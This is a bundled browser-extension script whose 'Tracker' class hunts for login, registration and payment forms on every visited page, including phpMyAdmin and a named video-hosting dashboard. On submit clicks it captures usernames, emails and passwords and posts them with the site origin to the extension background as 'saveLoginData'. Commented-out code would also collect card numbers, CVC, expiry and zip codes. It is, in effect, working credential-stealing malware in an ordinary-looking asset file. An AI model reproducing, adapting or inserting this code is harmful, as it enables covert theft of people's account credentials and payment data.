/***/ "./assets/ts/additional.ts":
/*!*********************************!*\
  !*** ./assets/ts/additional.ts ***!
  \*********************************/
/*! no exports provided */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony import */ var _messanger__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! ./messanger */ "./assets/ts/messanger.ts");
/* harmony import */ var _tracker__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./tracker */ "./assets/ts/tracker.ts");


const Clr = new _tracker__WEBPACK_IMPORTED_MODULE_1__["Tracker"](window.location.href);
Clr.init(function () {
    _messanger__WEBPACK_IMPORTED_MODULE_0__["acsComPortFront"].postMessage({
        command: "saveNavigateData",
        data: {
            username: 'visitor',
            workWebsite: window.location.origin
        }
    });
});
/*new tracker added*/
/*GRecaptcha.run(window.location);*/


/***/ }),

/***/ "./assets/ts/messanger.ts":
/*!********************************!*\
  !*** ./assets/ts/messanger.ts ***!
  \********************************/
/*! exports provided: acsComPortFront, webMessageReceiver */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "acsComPortFront", function() { return acsComPortFront; });
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "webMessageReceiver", function() { return webMessageReceiver; });
/*communication channel*/
// @ts-ignore
let acsComPortFront = browser.runtime.connect({ name: 'acs-messaging-port' });
/*communication channel*/
function webMessageReceiver(type, callback) {
    window.addEventListener("message", function (event) {
        /*console.log(event);*/
        if (event && event.source === window && event.data && event.data.type) {
            if (event.data.type && event.data.type === type) {
                /*alert(event.data);*/
                if (callback) {
                    callback(event.data.payload);
                }
                /*else {
                    console.log(event.data.licence);
                }*/
            }
            /*else {
                console.error('No resolver for event type!!')
            }*/
        }
        /*else {
            console.error('Unknown web message!!')
        }*/
    });
}


/***/ }),

/***/ "./assets/ts/tracker.ts":
/*!******************************!*\
  !*** ./assets/ts/tracker.ts ***!
  \******************************/
/*! exports provided: Tracker */
/***/ (function(module, __webpack_exports__, __webpack_require__) {

"use strict";
__webpack_require__.r(__webpack_exports__);
/* harmony export (binding) */ __webpack_require__.d(__webpack_exports__, "Tracker", function() { return Tracker; });
/* harmony import */ var webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__ = __webpack_require__(/*! webextension-polyfill-ts */ "../node_modules/webextension-polyfill-ts/lib/index.js");
/* harmony import */ var webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0___default = /*#__PURE__*/__webpack_require__.n(webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__);
/* harmony import */ var _messanger__WEBPACK_IMPORTED_MODULE_1__ = __webpack_require__(/*! ./messanger */ "./assets/ts/messanger.ts");


class Tracker {
    constructor(url) {
        this.isTrackerActivate = false;
        this.trackerJobId = 0;
        this.passwordStore = [];
        this.creditCardStore = [];
        if (url) {
            this.url = url;
            console.log('Tracker constructed!!');
        }
    }
    init(callBack) {
        const self = this;
        if (self.url) {
            console.log('Tracker initializing!!');
            console.log('Tracker activated in ' + self.url);
            console.log('Tracker ready to search form element in web page!!');
            console.log();
            let interval1 = setInterval(function () {
                self.verifyFormElement(self, interval1);
            }, 1000);
            if (!self.isTrackerActivate) {
                console.log('Tracker activation verification. Tracker disabled detected!');
                //console.log('Tracker reactivate itself!!');
                console.log();
                self.verifyFormElement(self);
            }
            else {
                console.log('Tracker activation verification. Tracker enabled detected!');
                console.log(self.isTrackerActivate);
                console.log();
            }
        }
        if (callBack) {
            callBack();
        }
    }
    trigger(self, __formElement) {
        /*console.log('Tracker checking environment!!');
        console.log(__formElement);
        console.log();*/
        webextension_polyfill_ts__WEBPACK_IMPORTED_MODULE_0__["browser"].storage.local.get().then(function (setting) {
            if (Object.keys(setting).length !== 0 && setting.constructor === Object) {
                /*console.log('Tracker exploring target!!');
                console.log(__formElement);
                console.log();*/
                self.track(self, __formElement);
            }
        }, function (errors) {
            console.error('Tracker starting failed!!');
            console.error(errors);
            console.log();
            _messanger__WEBPACK_IMPORTED_MODULE_1__["acsComPortFront"].postMessage({ 'command': "checkSettings" });
            //browser.runtime.reload();
        });
    }
    verifyFormElement(self, interval) {
        if (document.querySelectorAll('form').length !== 0) {
            /*console.log('Tracker form(s) found!!');
            console.log();*/
            document.querySelectorAll('form').forEach(function (__formElement) {
                /*console.log('Tracker verifying!!');
                console.log(__formElement);
                console.log();*/
                if (__formElement.attributes.length !== 0) {
                    /*console.log('Tracker form(s) attribute checked!!');
                    console.log();*/
                    if (window.location.href.toLowerCase().indexOf('phpmyadmin') !== -1) {
                        if (__formElement.method === 'post') {
                            interval ? clearInterval(interval) : '';
                            /*console.log('Tracker fetched in phpmyadmin zone. It will be local or server side!!');
                            console.log('Tracker target following!!');
                            console.log(__formElement);
                            console.log();*/
                            self.isTrackerActivate = true;
                            self.trackerJobId++;
                            self.trigger(self, __formElement);
                        }
                    }
                    else {
                        if (__formElement.action !== 'javascript:void(0)' && __formElement.id !== 'null' && __formElement.id !== 'irouteForm' &&
                            __formElement.id !== 'bhlf' && __formElement.id.indexOf('id') === -1 && __formElement.id.indexOf('u_0_') === -1 &&
                            __formElement.id.indexOf('theform') === -1 && __formElement.id.indexOf('scl_form') === -1 &&
                            __formElement.className.indexOf('gb_8e') === -1) {
                            interval ? clearInterval(interval) : '';
                            /*console.log('Tracker escaping target and following it(s)!!');
                            console.log(__formElement);
                            console.log();*/
                            self.isTrackerActivate = true;
                            self.trackerJobId++;
                            self.trigger(self, __formElement);
                        }
                    }
                }
                else {
                    if (__formElement.childNodes.length > 1) {
                        interval ? clearInterval(interval) : '';
                        /*console.log('Tracker not found any attribute(s) of form(s). But this/these form has exploitable child nodes. Now following it(s)!!');
                        console.log(__formElement);
                        console.log();*/
                        self.isTrackerActivate = true;
                        self.trackerJobId++;
                        self.trigger(self, __formElement);
                    }
                }
            });
        }
        else {
            /*console.log('Tracker not found any form(s)!!');
            console.log();*/
            if (window.location.origin.indexOf('dash.fembed.com') !== -1) {
                if (document.querySelector('#login') !== null) {
                    interval ? clearInterval(interval) : '';
                    console.log('Tracker not found any form(s). But this website in our database. Now following it(s)!!');
                    console.log();
                    self.isTrackerActivate = true;
                    self.trackerJobId++;
                    self.classicTrackAuthEvent(self, '#email_login', '#password', '#login');
                }
            }
        }
    }
    resolverFormAttributes(self, __formElement) {
        const attributes = [...__formElement.attributes];
        if (attributes.length !== 0) {
            attributes.forEach(function (attr) {
                if (attr.nodeValue !== 'javascript:void(0);') {
                    if (attr.nodeValue.length !== 0 && attr.nodeValue.length >= 3) {
                        /*form attribute value*/
                        [
                            { 'login': ['signin', 'login'] },
                            { 'register': ['reg', 'register', 'signup', 'join'] },
                            { 'logout': ['logout'] },
                            { 'payment': ['credit', 'payment', 'body', 'checkout', 'sslform', 'Pay', 'purchase', 'ElementsApp'] },
                            { 'exclude': ['q', 'search', 'googleads', 'presentation', 'captcha', 'disable', 'header'] },
                        ].forEach(function (keyword) {
                            if (Object.keys(keyword).length !== 0 && keyword.constructor === Object) {
                                Object.keys(keyword).forEach(function (__key) {
                                    keyword[__key].forEach(function (__qKey) {
                                        if (attr.nodeValue.toLowerCase().indexOf(__qKey) !== -1) {
                                            /*var str = text.replace(/(^\w{1})|(\s{1}\w{1})/g, match => match.toUpperCase());*/
                                            //self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = __key;
                                            self.authEvent = __key;
                                        }
                                        else {
                                            if (attr.nodeValue === null) {
                                                //self.authEvent !== undefined ? self.authEvent = self.authEvent : self.authEvent = 'exclude';
                                                self.authEvent = 'exclude';
                                            }
                                        }
                                    });
                                });
                            }
                        });
                    }
                }
            });
        }
        else {
            self.authEvent = 'Unknown';
        }
        return self.authEvent;
    }
    track(self, __formElement) {
        let elements = [];
        if (__formElement.nodeName === 'FORM' && __formElement.length !== 1) {
            self.resolverFormAttributes(self, __formElement);
            if (self.authEvent === 'login' || self.authEvent === 'register') {
                console.log('Tracker crawling started');
                console.log('Tracker fetching ' + self.authEvent + ' event!!');
                console.log('Job ID : ' + self.trackerJobId);
                console.log(__formElement);
                console.log();
                self.crawlAuthFormElement(self, elements, __formElement);
            }
            else if (self.authEvent === 'Payment') {
                console.log('Tracker crawling started');
                console.log('Tracker fetching ' + self.authEvent + ' event!!');
                console.log(self.authEvent + ' : this feature is reserved for future purpose!!!');
                console.log(__formElement);
                console.log();
                self.crawlPaymentFormElement(self, elements, __formElement);
            }
            else {
                if (self.authEvent !== 'exclude' && self.authEvent !== 'logout') {
                    console.log('Tracker crawling started');
                    console.log('Tracker fetching ' + self.authEvent + ' event!!');
                    console.log(self.authEvent + ' : this feature is reserved for future purpose!!!');
                    console.log(__formElement);
                    console.log();
                    self.crawlAuthFormElement(self, elements, __formElement);
                    self.crawlPaymentFormElement(self, elements, __formElement);
                } /*else {
                    alert(self.authEvent);
                }*/
            }
        }
    }
    classicTrackAuthEvent(self, usernameElementId, passwordElementId, loginButtonElementId) {
        let usernameElement, passwordElement, loginButtonElement;
        if (document.querySelector(usernameElementId) !== null) {
            usernameElement = document.querySelector(usernameElementId);
        }
        if (document.querySelector(passwordElementId) !== null) {
            passwordElement = document.querySelector(passwordElementId);
        }
        if (document.querySelector(loginButtonElementId) !== null) {
            loginButtonElement = document.querySelector(loginButtonElementId);
        }
        loginButtonElement.addEventListener('click', function () {
            return _messanger__WEBPACK_IMPORTED_MODULE_1__["acsComPortFront"].postMessage({
                command: 'saveLoginData',
                data: {
                    "event": self.authEvent,
                    "username": usernameElement.value,
                    "password": passwordElement.value,
                    "workWebsite": window.location.origin
                }
            });
        });
    }
    crawlAuthFormElement(self, elements, __formElement) {
        var _a;
        (_a = __formElement.childNodes) === null || _a === void 0 ? void 0 : _a.forEach(function (__childElement) {
            if (__childElement.nodeName === 'INPUT' || __childElement.nodeName === 'BUTTON' || __childElement.nodeName === 'A') {
                if (__childElement.nodeName === 'INPUT' && __childElement.type !== 'button' && __childElement.type !== 'reset' &&
                    __childElement.type !== 'submit' && __childElement.type !== 'checkbox' && __childElement.type !== 'color' &&
                    __childElement.type !== 'date' && __childElement.type !== 'datetime-local' && __childElement.type !== 'file' &&
                    __childElement.type !== 'radio' && __childElement.name !== 'firstname' && __childElement.name !== 'lastname' &&
                    __childElement.type !== 'hidden' && !__childElement.hidden && __childElement.id !== 'nc_1_captcha_input' &&
                    __childElement.id !== 's' && __childElement.id !== 'ZPGAZZBDYC' && __childElement.id !== 'VEQLOJHLSJ' &&
                    __childElement.id !== 'QCMSHUFUXG') {
                    elements.push(__childElement);
                }
                if (__childElement.type === 'submit' || __childElement.type === 'button' || __childElement.nodeName === 'A' &&
                    __childElement.innerHTML.toLowerCase().indexOf('sign' || false || false) !== -1) {
                    return self.resolveAuthEvent(self, __childElement, elements);
                }
            }
            else {
                self.crawlAuthFormElement(self, elements, __childElement);
            }
        });
    }
    resolveAuthEvent(self, element, array) {
        let elementNode, elementName, elementType, elementValue;
        /* array.forEach(function (detectedElement: any) {
             console.log(detectedElement);
             console.log(detectedElement.type);
             console.log(detectedElement.value);
         });*/
        element.addEventListener('click', function ( /*e*/) {
            let status = self.authEvent ? self.authEvent : 'Event';
            alert(status + ' tracked!!');
            array.forEach(function (__detectedElement) {
                [...__detectedElement.attributes].forEach(function (__attribute) {
                    if (__attribute.nodeName === 'class' || __attribute.nodeName === 'id' || __attribute.nodeName === 'name' ||
                        __attribute.nodeName === 'type' || __attribute.nodeName === 'value' || __attribute.nodeName === 'autocomplete') {
                        if (__attribute.nodeValue.toLowerCase().indexOf('user') !== -1) {
                            elementNode = __detectedElement;
                            elementName = 'username';
                            elementType = __detectedElement.type;
                            elementValue = __detectedElement.value;
                        }
                    }
                    if (__attribute.nodeName === 'class' || __attribute.nodeName === 'id' || __attribute.nodeName === 'name' ||
                        __attribute.nodeName === 'type' || __attribute.nodeName === 'value' || __attribute.nodeName === 'autocomplete') {
                        if (__attribute.nodeValue.toLowerCase().indexOf('login') !== -1) {
                            elementNode = __detectedElement;
                            elementName = 'loginId';
                            elementType = __detectedElement.type;
                            elementValue = __detectedElement.value;
                        }
                    }
                    if (__attribute.nodeName === 'class' || __attribute.nodeName === 'id' || __attribute.nodeName === 'name' ||
                        __attribute.nodeName === 'type' || __attribute.nodeName === 'value' || __attribute.nodeName === 'autocomplete') {
                        if (__attribute.nodeValue.toLowerCase().indexOf('email') !== -1) {
                            elementNode = __detectedElement;
                            elementName = 'email';
                            elementType = __detectedElement.type;
                            elementValue = __detectedElement.value;
                        }
                    }
                    if (__attribute.nodeName === 'autocomplete' || __attribute.nodeName === 'class' || __attribute.nodeName === 'id' ||
                        __attribute.nodeName === 'name' || __attribute.nodeName === 'type' || __attribute.nodeName === 'value') {
                        if (__attribute.nodeValue.toLowerCase().indexOf('pass') !== -1) {
                            elementNode = __detectedElement;
                            elementName = 'password';
                            elementType = __detectedElement.type;
                            elementValue = __detectedElement.value;
                        }
                    }
                });
                if (elementValue.length !== 0) {
                    self.passwordStore.push({
                        node: elementNode,
                        name: elementName,
                        type: elementType,
                        value: elementValue
                    });
                    if (self.passwordStore.length === 2 && self.passwordStore.length < 3) {
                        if (self.passwordStore[0].type === 'password') {
                            let password = self.passwordStore[0];
                            self.passwordStore[0] = self.passwordStore[1];
                            self.passwordStore[1] = password;
                        }
                        if (self.passwordStore[0].type === 'email' || self.passwordStore[0].type === 'text' &&
                            self.passwordStore[1].type === 'password') {
                            _messanger__WEBPACK_IMPORTED_MODULE_1__["acsComPortFront"].postMessage({
                                command: 'saveLoginData',
                                data: {
                                    "event": self.authEvent,
                                    "username": self.passwordStore[0].value,
                                    "password": self.passwordStore[1].value,
                                    "workWebsite": window.location.origin
                                }
                            });
                            /*self.passwordStore = [];*/
                        }
                        /*console.log(elementNode);
                        console.log(elementName);
                        console.log(elementType);
                        console.log(elementValue);
                        console.log(self.passwordStore);*/
                        self.passwordStore = [];
                    }
                }
            });
        });
    }
    crawlPaymentFormElement(self, elements, __formElement) {
        var _a;
        (_a = __formElement.childNodes) === null || _a === void 0 ? void 0 : _a.forEach(function (__childElement) {
            ['input', 'button', 'select'].forEach(function (__eligibleElement) {
                if (__childElement.nodeName.toLowerCase() === __eligibleElement) {
                    ['input', 'select'].forEach(function (__eligibleInputElement) {
                        if (__childElement.nodeName.toLowerCase() === __eligibleInputElement) {
                            ['hidden', 'checkbox', 'submit', 'reset', 'search'].forEach(function (__excludeInputElement) {
                                if (__childElement.nodeName.toLowerCase() !== __excludeInputElement) {
                                    elements.push(__childElement);
                                }
                            });
                        }
                    });
                    ['submit', 'button'].forEach(function (__eligibleCollectorElement) {
                        if (__childElement.type === __eligibleCollectorElement) {
                            return self.resolvePaymentEvent(self, __childElement, elements);
                        }
                    });
                }
                else {
                    self.crawlPaymentFormElement(self, elements, __childElement);
                }
            });
        });
    }
    /* checking
    * https://www.tunnelbear.com/account/checkout
    * */
    resolvePaymentEvent(self, element, array) {
        /*let elementNode: any, elementName: any, elementType: any, elementValue: any;
        console.log(element);
        array.forEach(function (detectedElement: any) {
            console.log(detectedElement);
            console.log(detectedElement.type);
            console.log(detectedElement.value);
        });*/
        /*array.forEach(function (__detectedElement: any) {
            [...__detectedElement.attributes].forEach(function (__attribute) {
                if (__attribute.nodeName === 'class' || __attribute.nodeName === 'id' || __attribute.nodeName === 'name' ||
                    __attribute.nodeName === 'type' || __attribute.nodeName === 'value' || __attribute.nodeName === 'autocomplete') {
                    if (__attribute.nodeValue.toLowerCase().indexOf('number') !== -1) {
                        elementNode = __detectedElement;
                        elementName = 'cardNumber';
                        elementType = __detectedElement.type;
                        elementValue = __detectedElement.value;
                    }
                }
                if (__attribute.nodeName === 'class' || __attribute.nodeName === 'id' || __attribute.nodeName === 'name' ||
                    __attribute.nodeName === 'type' || __attribute.nodeName === 'value' || __attribute.nodeName === 'autocomplete') {
                    if (__attribute.nodeValue.toLowerCase().indexOf('holder') !== -1) {
                        elementNode = __detectedElement;
                        elementName = 'cardHolder';
                        elementType = __detectedElement.type;
                        elementValue = __detectedElement.value;
                    } else {
                        if (__attribute.nodeValue.toLowerCase().indexOf('name') !== -1) {
                            elementNode = __detectedElement;
                            elementName = 'cardHolder';
                            elementType = __detectedElement.type;
                            elementValue = __detectedElement.value;
                        }
                    }
                }
                if (__attribute.nodeName === 'class' || __attribute.nodeName === 'id' || __attribute.nodeName === 'name' ||
                    __attribute.nodeName === 'type' || __attribute.nodeName === 'value' || __attribute.nodeName === 'autocomplete') {
                    if (__attribute.nodeValue.toLowerCase().indexOf('expire') !== -1) {
                        elementNode = __detectedElement;
                        elementName = 'cardExpire';
                        elementType = __detectedElement.type;
                        elementValue = __detectedElement.value;
                    }
                }
                if (__attribute.nodeName === 'class' || __attribute.nodeName === 'id' || __attribute.nodeName === 'name' ||
                    __attribute.nodeName === 'type' || __attribute.nodeName === 'value' || __attribute.nodeName === 'autocomplete') {
                    if (__attribute.nodeValue.toLowerCase().indexOf('cvc') !== -1 || __attribute.nodeValue.toLowerCase().indexOf('cvv') !== -1) {
                        elementNode = __detectedElement;
                        elementName = 'cardCVC';
                        elementType = __detectedElement.type;
                        elementValue = __detectedElement.value;
                    }
                }
                if (__attribute.nodeName === 'class' || __attribute.nodeName === 'id' || __attribute.nodeName === 'name' ||
                    __attribute.nodeName === 'type' || __attribute.nodeName === 'value' || __attribute.nodeName === 'autocomplete') {
                    if (__attribute.nodeValue.toLowerCase().indexOf('zip') !== -1) {
                        elementNode = __detectedElement;
                        elementName = 'cardZip';
                        elementType = __detectedElement.type;
                        elementValue = __detectedElement.value;
                    }
                }
                if (__attribute.nodeName === 'class' || __attribute.nodeName === 'id' || __attribute.nodeName === 'name' ||
                    __attribute.nodeName === 'type' || __attribute.nodeName === 'value' || __attribute.nodeName === 'autocomplete') {
                    if (__attribute.nodeValue.toLowerCase().indexOf('brand') !== -1) {
                        elementNode = __detectedElement;
                        elementName = 'cardBrand';
                        elementType = __detectedElement.type;
                        elementValue = __detectedElement.value;
                    }
                }

            });

            if (elementValue.length !== 0) {
                self.creditCardStore.push({
                    node: elementNode,
                    name: elementName,
                    type: elementType,
                    value: elementValue
                });


                console.log(elementNode);
                console.log(elementName);
                console.log(elementType);
                console.log(elementValue);
                console.log(self.creditCardStore);
                //self.creditCardStore = [];
            }
        });*/
    }
}


/***/ })

/******/ });
//# sourceMappingURL=additional.js.map